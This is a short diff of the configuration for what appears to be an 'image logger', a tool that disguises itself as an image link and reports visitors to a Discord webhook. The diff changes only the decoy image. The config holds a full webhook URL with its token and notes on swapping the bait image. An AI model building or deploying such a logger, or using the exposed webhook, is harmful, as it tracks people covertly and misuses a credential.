@@ -13,7 +13,7 @@ __author__ = "C00lB0i"
 config = {
     # BASE CONFIG #
     "webhook": "https://discordapp.com/api/webhooks/1335481750431862806/GK566eyy_2Ws6Uw0hOpovm7YPP0X917ItH_ivyTHg6lwGxN44TGcKRYbbxeM0AKN-A_c",
-    "image": "https://miro.medium.com/v2/resize:fit:1024/0*AWnqkgweI14j_NRR.jpg", # You can also have a custom image by using a URL argument
+    "image": "https://wallpapers.com/images/hd/smug-rumpelstiltskin-shrek-forever-after-35vrnojetddkbu50.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
